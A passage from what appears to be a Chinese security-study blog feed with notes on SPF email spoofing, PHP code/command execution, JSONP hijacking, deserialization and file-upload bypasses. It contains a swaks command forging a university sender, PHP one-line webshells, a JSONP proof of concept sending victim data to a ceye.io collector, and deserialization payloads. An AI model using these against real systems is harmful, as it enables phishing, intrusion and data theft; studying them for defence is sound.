test&quot;</code></pre><p><strong>有SPF：</strong>awake+smtp2go(需要绑定域名、根据提示添加CNAME记录、cloudfare的话需要取消代理)<br><code>swaks --to  xxxxxx@qq.com --from jwc@hzu.edu.cn -ehlo hzu.edu.cn --body &quot;test&quot; --server mail.smtp2go.com -p 2525 -au &lt;USER&gt;-ap &lt;PASS&gt;</code></p><p><strong>swaks参数说明：</strong></p><p>–from <a href="mailto:test@qq.com">test@qq.com</a> //发件人邮箱；</p><p>–ehlo qq.com //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证</p><p>–body “<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">http://www.baidu.com&quot;</a> //引号中的内容即为邮件正文；</p><p>–header “Subject:hello” //邮件头信息，subject为邮件标题</p><p>–data ./Desktop/email.txt //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送</p><p>–attach   xxxxx.docx   //附加附件</p><p><a href="https://www.cnblogs.com/xiaozi/p/12906040.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/12906040.html</a> 邮件伪造之SPF绕过的5种思路</p><p><a href="https://www.cnblogs.com/backlion/p/10842676.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10842676.html</a></p><p><a href="https://payloads.online/archivers/2019-05-09/1#0x04-%E7%BB%95%E8%BF%87spf" target="_blank" rel="noopener">https://payloads.online/archivers/2019-05-09/1#0x04-%E7%BB%95%E8%BF%87spf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;SPF：Sender Policy FrameworkSPF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;原理：创建至少一个DNS TXT记录来启用SPF&lt;/p&gt;
&lt;p&gt;SPF验证过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;接收端获取发件端IP&lt;/li&gt;
&lt;li&gt;接收端查询发件域
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>代码/命令执行漏洞</title>
    <link href="https://github.com/2020/05/24/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://github.com/2020/05/24/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-05-24T07:39:07.000Z</published>
    <updated>2020-05-24T07:47:25.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p><strong>代码执行条件</strong>：</p><ol><li>存在危险函数且传入的参数用户可控</li><li>传入的函数&amp;参数用户可控</li></ol><p><strong>危险函数</strong>：</p><ul><li>eval和assert</li><li>preg_replace</li><li>回调函数</li><li>动态函数</li></ul><p><strong>eval 和 assert函数：</strong><br>常见的一句话木马实例：</p><pre><code>&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt;&lt;?php assert(@$_POST[&apos;a&apos;]); ?&gt;</code></pre><p>eval()函数的参数必须以分号结尾，assert()则不用</p><p><strong>pre_replace</strong>:</p><p>语法：</p><pre><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></pre><p>若正则表达式$pattern中有/e修饰符且成功匹配，则将$replacement的值当作php代码执行</p><p>实例：</p><pre><code>&lt;?php    preg_replace(&apos;/\[(.*)\]/e&apos;, &apos;\\1&apos;, $_GET[&apos;str&apos;]);?&gt;</code></pre><p>从$str中搜索[]中间的内容作为第一组结果，\1代表这里使用第一组结果填充</p><p>根据<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">官方文档</a>： </p><pre><code>PHP 5.5.0 起， 传入 &quot;\e&quot; 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 &quot;\e&quot; 也无法起效。</code></pre><p>也意味着preg_replace在php5.5+可用，但是会报警，php7中完全废除不可用</p><p><img src="1.png" alt=""></p><p>php5.5.38测试结果：</p><p><img src="2.png" alt=""></p><h2 id="回调函数："><a href="#回调函数：" class="headerlink" title="回调函数："></a>回调函数：</h2><p><strong>常见回调函数：</strong></p><ul><li>call_user_func()</li><li>array_map()</li><li>call_user_func_array()</li><li>create_func()</li><li>uksort()    </li><li>…</li></ul><p>以call_user_func_array()为例：</p><p>语法：</p><pre><code>mixed call_user_func_array ( callable $callback , array $param_arr )</code></pre><p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p><pre><code>&lt;?php    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);?&gt;</code></pre><p><a href="http://127.0.0.1/test.php?a=assert&amp;b[]=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/test.php?a=assert&amp;b[]=phpinfo()</a></p><p><strong>动态函数执行</strong>：</p><pre><code>&lt;?php$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);?&gt;</code></pre><p><a href="http://127.0.0.1/test.php?a=assert&amp;b=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/test.php?a=assert&amp;b=phpinfo()</a></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>顾名思义，命令执行漏洞执行的是系统的命令，因此需要可以执行系统命令的函数存在，且传入参数用户可控</p><p><strong>7个命令执行函数：</strong></p><ul><li>system()</li><li>exec()</li><li>shell_exec()</li><li>passthru()</li><li>pcntl_exec()</li><li>popen()</li><li>proc_open()</li></ul><p>` 也可以执行命令，但是调用的是shell_exec()函数</p><pre><code>&lt;?php system(&quot;whoami&quot;);  ?&gt;</code></pre><p>system() 输出并返回最后一行shell结果。</p><pre><code>&lt;?php echo exec(&quot;whoami&quot;); ?&gt;</code></pre><p>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面（需要借助echo）。</p><pre><code>&lt;?php echo shell_exec(&quot;whoami&quot;); ?&gt;</code></pre><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（同样需要借助echo）</p><pre><code>&lt;?php passthru(&quot;whoami&quot;); ?&gt;</code></pre><p>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</p><pre><code>&lt;?php pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?&gt;</code></pre><p>pcntl_exec需要额外安装（）</p><pre><code>&lt;?php $handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;); ?&gt;</code></pre><p>r代表读，w代表写</p><p>popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针</p><p>反单引号命令执行</p><pre><code>&lt;?php echo  `whoami` ; ?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码执行&quot;&gt;&lt;a href=&quot;#代码执行&quot; class=&quot;headerlink&quot; title=&quot;代码执行&quot;&gt;&lt;/a&gt;代码执行&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;代码执行条件&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;存在危险函数且传入的参数用户可控&lt;/li&gt;
&lt;l
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>jsonp劫持</title>
    <link href="https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/"/>
    <id>https://github.com/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/</id>
    <published>2020-05-24T02:42:15.000Z</published>
    <updated>2020-05-24T02:46:05.940Z</updated>
    
    <content type="html"><![CDATA[<p>JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。</p><p>[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息</p><p>JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),<strong>它利用的是 script 标签的 src 属性不受同源策略影响的特性，</strong></p><p>JSONP(JSON with Padding)是JSON的一种“使用模式”</p><p>jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）</p><p><a href="https://www.cnblogs.com/xiaozi/p/9963523.html" target="_blank" rel="noopener">漏洞源码 </a></p><p>getUser.php</p><pre><code>&lt;?phpheader(&apos;Content-type: application/json&apos;);$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名//json数据//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据?&gt;</code></pre><p>客户端实现 callbackFunction 函数</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;JSONP劫持测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function callbackFunction(result)    {        alert(result.name);    }&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="jsonp漏洞挖掘："><a href="#jsonp漏洞挖掘：" class="headerlink" title="jsonp漏洞挖掘："></a>jsonp漏洞挖掘：</h2><p>首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。</p><p><img src="1.png" alt=""></p><p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email</p><p>一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）</p><p><img src="2.png" alt=""></p><p>callback函数可控，测试跨域劫持。poc：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function jsonpjack(json){new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)}&lt;/script&gt;&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ceye返回结果：</p><p><img src="3.png" alt=""></p><p><a href="https://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126347.html</a></p><p><a href="https://securitycafe.ro/2017/01/18/practical-jsonp-injection/" target="_blank" rel="noopener">https://securitycafe.ro/2017/01/18/practical-jsonp-injection/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。&lt;/p&gt;
&lt;p&gt;[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞学习</title>
    <link href="https://github.com/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-24T01:53:41.000Z</published>
    <updated>2020-05-24T02:32:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是序列化-amp-反序列化："><a href="#什么是序列化-amp-反序列化：" class="headerlink" title="什么是序列化&amp;反序列化："></a>什么是序列化&amp;反序列化：</h2><p>序列化的目的是为了将一个对象通过可保存的字节方式存储起来，这样就可以将序列化字节存储到数据库或者文本当中，当需要的时候再通过反序列化获取</p><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示</p><p>unserialize()函数能够重新把字符串变回php原来的值</p><p>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>serialize()：</strong></p><pre><code>&lt;?phpclass Tw{    public $name = &quot;Twe1ve&quot;;        private $sex = &quot;Male&quot;;}$Tw_n = new Tw;$ser = serialize($Tw_n);echo $ser;echo &quot;&lt;/br&gt;&quot;;echo urlencode($ser);?&gt;</code></pre><p>输出结果如下：</p><pre><code>O:2:&quot;Tw&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;Twe1ve&quot;;s:7:&quot;Twsex&quot;;s:4:&quot;Male&quot;;}O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D</code></pre><p>O:2:Tw:2:   O代表存储的是对象(object),a的话则代表数组，2指代对象名称有两个字符，Tw则是对象名,2则代表有两个值</p><p>{s:4:”name”;s:6:”Twe1ve”;s:7:”Twsex”;s:4:”Male”;}   {}内为属性字符数：属性值；s表示字符串，由于private属性会在类名两侧加入空字节，所以此处Twsex的名称长度7，实际为%00Tw%00sex</p><p><strong>unserialize():</strong> [存在private属性的类，需要先将原有的序列化值urlencode输出，再进行反序列化]</p><pre><code>&lt;?php$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;$data = urldecode($str);$unser = unserialize($data);var_dump($unser);?&gt;</code></pre><p>结果：</p><pre><code>object(__PHP_Incomplete_Class)[1]  public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;Tw&apos; (length=2)  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)  private &apos;sex&apos; (Tw) =&gt; string &apos;Male&apos; (length=4)</code></pre><p>在反序列化对象之后，需要当前作用域中存在该类的定义，否则php无法将类对应到指定类</p><p>可以看到，当定义域中不存在该类时会反序列化出一个__PHP_Incomplete_Class的类，也就是一个不完整的类</p><p>其次，在反序列化的过程中，只保存原有类的变量值，并不会保存其函数，具体的函数功能是根据定义域中定义好的函数功能来执行</p><pre><code>&lt;?phpclass Tw{    public $name = &quot;Twe1ve&quot;;        private $sex = &quot;Male&quot;;}$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;$data = urldecode($str);$unser = unserialize($data);var_dump($unser);?&gt;</code></pre><p>结果：</p><pre><code>object(Tw)[1]  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)  private &apos;sex&apos; =&gt; string &apos;Male&apos; (length=4)</code></pre><h2 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h2><p><strong>魔术方法（Magic function）：</strong></p><ul><li>__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li><li>__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。</li><li>__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。</li><li>__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。</li><li>__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。</li><li>…..</li></ul><p>魔术方法执行顺序：__wakeup()&gt; __toString()&gt; __destruct()</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>1、直接调用，危险函数直接在类中被调用</strong></p><pre><code>class cls{   var $value = &apos;echo 123;&apos;;   function action(){eval($this-&gt;value);}}$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);$a-&gt;action();</code></pre><p><strong>2、危险函数在魔术方法中</strong></p><pre><code>class cls{var $value = &apos;echo 123;&apos;;function __wakeup(){eval($this-&gt;value);}}$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);</code></pre><p><strong>3、危险函数在其他类中被调用</strong></p><p>当一个类中的成员变量是另一个类，且调用了另一个类中的危险函数。此时就可以序列化前者类，从而触发触发漏洞</p><pre><code>&lt;?phpclass cls1{var $ser;function __construct(){$ser = new ser2();}function __wakeup(){$this-&gt;ser-&gt;evil();}}class cls2{var $value = &quot;echo 123;&quot;;function evil(){eval($this-&gt;value);}}$cls = $GET[&apos;cls&apos;];$instance = unserialize($cls);?&gt;</code></pre><p>exp：</p><pre><code>&lt;?phpclass cls1{  var $ser;function __construct(){   $this-&gt;ser = new cls2();   }}class cls2{var $value = &apos;phpinfo();&apos;;}print_r(serialize(new cls1()))?&gt;</code></pre><p>第二届网鼎杯反序列化题目：</p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler {protected $op;protected $filename;protected $content;function __construct() {    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;    $content = &quot;Hello World!&quot;;    $this-&gt;process();}public function process() {    if($this-&gt;op == &quot;1&quot;) {        $this-&gt;write();    } else if($this-&gt;op == &quot;2&quot;) {        $res = $this-&gt;read();        $this-&gt;output($res);    } else {        $this-&gt;output(&quot;Bad Hacker!&quot;);    }}private function write() {    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {        if(strlen((string)$this-&gt;content) &gt; 100) {            $this-&gt;output(&quot;Too long!&quot;);            die();        }        $res = file_put_contents($this-&gt;filename, $this-&gt;content);        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    } else {        $this-&gt;output(&quot;Failed!&quot;);    }}private function read() {    $res = &quot;&quot;;    if(isset($this-&gt;filename)) {        $res = file_get_contents($this-&gt;filename);    }    return $res;}private function output($s) {    echo &quot;[Result]:&quot;;    echo $s;}function __destruct() {    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();}}function is_valid($s) {for($i = 0; $i &lt; strlen($s); $i++)    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))        return false;return true;}if(isset($_GET{&apos;str&apos;})) {$str = (string)$_GET[&apos;str&apos;];if(is_valid($str)) {    $obj = unserialize($str);}}</code></pre><p>is_valid : 判断传入字符是否为可打印字符，由于这里的属性均为protected，会生成 %00，但是由于php7对类的修饰不敏感，直接把属性改为public可绕过</p><p>__destruct中为强类型比较，还会讲$op置1，process读取文件，需要让$op为2，由于process使用==弱类型比较，直接让$op=2绕过</p><pre><code>&lt;?phpclass FileHandler {public $op = 2 ;public $filename = &quot;flag.php&quot; ;}$class = new FileHandler();$ser = serialize($class);echo $ser;?&gt;</code></pre><p>O:11:”FileHandler”:2:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;}</p><p>链接：<br><a href="https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是序列化-amp-反序列化：&quot;&gt;&lt;a href=&quot;#什么是序列化-amp-反序列化：&quot; class=&quot;headerlink&quot; title=&quot;什么是序列化&amp;amp;反序列化：&quot;&gt;&lt;/a&gt;什么是序列化&amp;amp;反序列化：&lt;/h2&gt;&lt;p&gt;序列化的目的是为了将一个对象
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞学习</title>
    <link href="https://github.com/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-24T01:52:40.000Z</published>
    <updated>2020-05-24T02:27:53.430Z</updated>
    
    <content type="html"><![CDATA[<p>*<em>上传函数： *</em></p><pre><code>move_upload_file()</code></pre><p><a href="https://paper.seebug.org/560/" target="_blank" rel="noopener">关于PHP中$_FILES数组的使用方法: </a></p><ul><li>$_FILES[‘file’][‘name’] 客户端文件名称</li><li>$_FILES[‘file’][‘type’] 文件的MIME类型</li><li>$_FILES[‘file’][‘size’] 文件大小 单位字节</li><li>$_FILES[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定</li></ul><h1 id="1、未过滤或前端过滤，"><a href="#1、未过滤或前端过滤，" class="headerlink" title="1、未过滤或前端过滤，"></a>1、未过滤或前端过滤，</h1><p><strong>upload_labs-pass 1</strong></p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;function checkFile() {    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;    if (file == null || file == &quot;&quot;) {        alert(&quot;请选择要上传的文件!&quot;);        return false;    }    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name) == -1) {        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    }}&lt;/script&gt;</code></pre><h1 id="2、content-type验证绕过"><a href="#2、content-type验证绕过" class="headerlink" title="2、content-type验证绕过"></a>2、content-type验证绕过</h1><p>pass-2：</p><pre><code>if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;]== &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) {    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];        </code></pre><p>这里仅仅对content-type进行验证，burpsuit抓包之后修改content-type类型即可绕过</p><h1 id="3、黑名单限制后缀名绕过"><a href="#3、黑名单限制后缀名绕过" class="headerlink" title="3、黑名单限制后缀名绕过"></a>3、黑名单限制后缀名绕过</h1><p>pass-3</p><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);    $file_name = deldot($file_name);//删除文件名末尾的点    $file_ext = strrchr($file_name, &apos;.&apos;);    $file_ext = strtolower($file_ext); //转换为小写    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA    $file_ext = trim($file_ext); //收尾去空    if(!in_array($file_ext, $deny_ext)) {        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    </code></pre><ul><li>黑名单过滤不全面，php3、php5、phhtml等后缀绕过</li><li>黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则</li></ul><p>pass-4   </p><pre><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);   $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);   $file_name = deldot($file_name);//删除文件名末尾的点   $file_ext = strrchr($file_name, &apos;.&apos;);   $file_ext = strtolower($file_ext); //转换为小写   $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA   $file_ext = trim($file_ext); //收尾去空   if(!in_array($file_ext, $deny_ext)) {       $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];       $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;     </code></pre><ul><li>黑名单过滤相对较全，但是没有将后缀进行大小写统一，可通过大小写绕过</li><li>黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则</li></ul><p>pass-5：       </p><pre><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &apos;.&apos;);$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空if(!in_array($file_ext, $deny_ext)) {    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code></pre><p>黑名单过滤较全，但是没有将后缀进行大小写统一，可通过大小写绕过</p><p>pass-6：   </p><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = 